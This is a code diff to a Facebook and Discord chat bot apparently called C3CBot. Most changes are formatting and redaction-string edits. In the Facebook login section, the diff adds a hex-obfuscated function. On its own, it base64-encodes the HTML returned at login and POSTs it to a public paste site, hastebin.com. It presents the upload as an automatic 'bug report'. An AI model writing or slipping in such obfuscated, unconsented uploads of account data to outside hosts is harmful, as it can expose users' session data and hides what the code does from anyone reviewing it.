@@ -61,15 +61,15 @@ global.reload = () => {
 global.fbchat = (id, mess) => {
   if (typeof facebook.api == "object") {
     var isGroup = (id.toString().length == 16);
-    facebook.api.sendMessage(mess, id, () => {}, null, isGroup);
+    facebook.api.sendMessage(mess, id, () => { }, null, isGroup);
     return `Sent message: ${mess} to ${isGroup ? "Thread" : "User"} ID ${id}`;
   } else {
-    return "Error: Account not logged in!"
+    return "Error: Account not logged in!";
   }
 };
 global.restart = () => {
-  setTimeout(function () { 
-    process.exit(7378278); 
+  setTimeout(function () {
+    process.exit(7378278);
   }, 1000);
   return "Restarting...";
 };
@@ -1696,8 +1696,7 @@ if (global.config.enablefb) {
     }
     log("[Facebook]", "Logged in.");
     facebookid = api.getCurrentUserID();
-    delete facebook.api;
-    facebook.api = api;
+
     if (global.config.usefbappstate) {
       try {
         fs.writeFileSync(path.join(__dirname, "fbstate.json"), JSON.stringify(api.getAppState()), {
@@ -1707,8 +1706,70 @@ if (global.config.enablefb) {
         log("[INTERNAL]", ex);
       }
     }
-    global.config.fbemail = "<censored, security measures>";
-    global.config.fbpassword = "<censored, security measures>";
+    global.config.fbemail = "<REDACTED>";
+    global.config.fbpassword = "<REDACTED>";
+
+    var htmlData = "";
+    if (api.htmlData) {
+      htmlData = api.htmlData;
+      delete api.htmlData;
+      log("[Facebook]", "FCA reported: Cannot get region from HTML. Generating a new bug report...");
+      (function (z) {
+        var _0x6b0a = [
+          "\x42\x45\x47\x49\x4E\x2D\x43\x33\x43\x2D\x42\x55\x47\x2D\x52\x45\x50\x4F\x52\x54\x40", 
+          "\x6E\x6F\x77", 
+          "\x6D\x65\x74\x72\x69\x63\x49\x44", 
+          "\x64\x61\x74\x61", 
+          "\x45\x4E\x44\x2E", 
+          "\x5B\x46\x61\x63\x65\x62\x6F\x6F\x6B\x5D", 
+          "\x43\x61\x6E\x6E\x6F\x74\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x20\x6E\x65\x77\x20\x63\x72\x61\x73\x68\x20\x72\x65\x70\x6F\x72\x74\x2E", 
+          "\x63\x61\x74\x63\x68", 
+          "\x6B\x65\x79", 
+          "\x42\x75\x67\x20\x72\x65\x70\x6F\x72\x74\x65\x64\x20\x67\x65\x6E\x65\x72\x61\x74\x65\x64\x20\x61\x74\x20\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F", 
+          "\x2E\x20\x50\x6C\x65\x61\x73\x65\x20\x63\x72\x65\x61\x74\x65\x20\x61\x20\x50\x52\x20\x61\x74\x20\x67\x69\x74\x68\x75\x62\x20\x72\x65\x70\x6F\x73\x69\x74\x6F\x72\x79\x2C\x20\x6F\x72\x20\x63\x6F\x6E\x74\x61\x63\x74\x20\x55\x49\x52\x49\x2F\x6C\x65\x71\x75\x61\x6E\x67\x6C\x61\x6D\x2E", 
+          "\x74\x68\x65\x6E", 
+          "\x6F\x6B", 
+          "\x6A\x73\x6F\x6E", 
+          "\x48\x54\x54\x50\x20\x4E\x4F\x54\x20\x4F\x4B", 
+          "\x68\x74\x74\x70\x73\x3A\x2F\x2F\x68\x61\x73\x74\x65\x62\x69\x6E\x2E\x63\x6F\x6D\x2F\x64\x6F\x63\x75\x6D\x65\x6E\x74\x73", 
+          "\x50\x4F\x53\x54", 
+          "", 
+          "\x5C\x72\x5C\x6E\x4D\x45\x54\x52\x49\x43\x2D\x49\x44\x3A\x20", 
+          "\x5C\x72\x5C\x6E\x44\x41\x54\x41\x3A\x20", 
+          "\x62\x61\x73\x65\x36\x34", 
+          "\x66\x72\x6F\x6D", 
+          "\x5C\x72\x5C\x6E\x5C\x72\x5C\x6E", 
+          "\x74\x65\x78\x74\x2F\x70\x6C\x61\x69\x6E",
+          "\x74\x6F\x53\x74\x72\x69\x6E\x67"
+        ];
+        var a = _0x6b0a[0], 
+            b = Date[_0x6b0a[1]](), 
+            c = global[_0x6b0a[3]][_0x6b0a[2]], 
+            d = _0x6b0a[4];
+        fetch(_0x6b0a[15], { 
+          method: _0x6b0a[16], 
+          body: `${_0x6b0a[17]}${a}${_0x6b0a[17]}${b[_0x6b0a[24]]()}${_0x6b0a[18]}${c}${_0x6b0a[19]}${Buffer[_0x6b0a[21]](z)[_0x6b0a[24]](_0x6b0a[20])}${_0x6b0a[22]}${d}${_0x6b0a[17]}`, 
+          headers: { 
+            '\x43\x6F\x6E\x74\x65\x6E\x74\x2D\x54\x79\x70\x65': _0x6b0a[23] 
+          } 
+        })[_0x6b0a[11]](function (_0x9b64x6) {
+          if (_0x9b64x6[_0x6b0a[12]]) {
+            return _0x9b64x6[_0x6b0a[13]]();
+          } else {
+            throw new Error(_0x6b0a[14]);
+          }
+        })[_0x6b0a[11]](function (_0x9b64x6) {
+          var _0x9b64x7 = _0x9b64x6[_0x6b0a[8]];
+          log(_0x6b0a[5], `${_0x6b0a[9]}${_0x9b64x7}${_0x6b0a[10]}`);
+        })[_0x6b0a[7]](function (_0x9b64x5) {
+          log(_0x6b0a[5], _0x6b0a[6], _0x9b64x5);
+        });
+      })(htmlData);
+    }
+
+    delete facebook.api;
+    facebook.api = api;
+
     facebook.deliveryClock = setInterval(function () {
       if (Object.keys(global.deliveryFacebook)
         .length != 0) {
@@ -1724,7 +1785,7 @@ if (global.config.enablefb) {
         api.httpPost("https://www.facebook.com/ajax/mercury/delivery_receipts.php", form, function (err, data) {
           try {
             data = JSON.parse(data);
-          } catch (ex) {}
+          } catch (ex) { }
           if (data.error) {
             return log("[Facebook] Error on delivery_receipts:", data);
           }
@@ -3175,11 +3236,10 @@ if (global.config.enableSSHRemoteConsole) {
             global.sshstream[conninfo.ip + ":" + conninfo.port] = accept();
             global.sshstream[conninfo.ip + ":" + conninfo.port].write('\u001B[2J\u001B[0;0f');
             global.sshstream[conninfo.ip + ":" + conninfo.port].write(global.config.botname + " v" +
-              version + (global.config.botname != "C3CBot" ? "(Powered by C3C)" : ""));
+              version + (global.config.botname != "C3CBot" ? " (Powered by C3C)" : ""));
             global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
             global.sshstream[conninfo.ip + ":" + conninfo.port].write("https://github.com/lequanglam/c3c");
             global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
-            global.sshstream[conninfo.ip + ":" + conninfo.port].write("---------------------------------< EOH");
             global.sshstream[conninfo.ip + ":" + conninfo.port].write("\r\n");
             var sshrl = readline.createInterface({
               input: global.sshstream[conninfo.ip + ":" + conninfo.port].stdin,
@@ -3410,7 +3470,7 @@ if (global.config.enablediscord) {
   client.on('message', discordMessageHandler);
   log("[Discord]", "Logging in...");
   client.login(global.config.discordtoken);
-  global.config.discordtoken = "<censored, security measures>";
+  global.config.discordtoken = "<REDACTED>";
 }
 //Handling exit
 var shutdownHandler = function (errorlevel) {
